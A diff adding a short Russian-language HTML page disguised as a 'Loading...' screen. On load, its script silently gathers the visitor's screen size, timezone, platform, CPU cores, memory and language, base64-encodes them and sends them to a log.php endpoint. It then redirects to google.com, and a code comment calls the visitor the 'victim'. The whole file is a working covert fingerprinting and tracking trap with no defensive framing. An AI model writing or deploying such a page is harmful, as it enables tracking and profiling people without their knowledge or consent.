@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        function sendData() {
+            let screenSize = window.screen.width + "x" + window.screen.height;
+            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let platform = navigator.platform;
+            let cpuCores = navigator.hardwareConcurrency || "Неизвестно";
+            let memory = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Неизвестно";
+            let browserLang = navigator.language;
+
+            let data = {
+                screen: screenSize,
+                timezone: timezone,
+                platform: platform,
+                cpu: cpuCores,
+                ram: memory,
+                lang: browserLang
+            };
+
+            fetch("log.php?data=" + btoa(JSON.stringify(data)));  // Отправка данных в log.php
+        }
+
+        sendData();
+        setTimeout(() => {
+            window.location.href = "https://google.com"; // Куда перенаправлять жертву
+        }, 2000);
+    </script>
+</head>
+<body>
+    <h1>Загрузка...</h1>
+</body>
+</html>
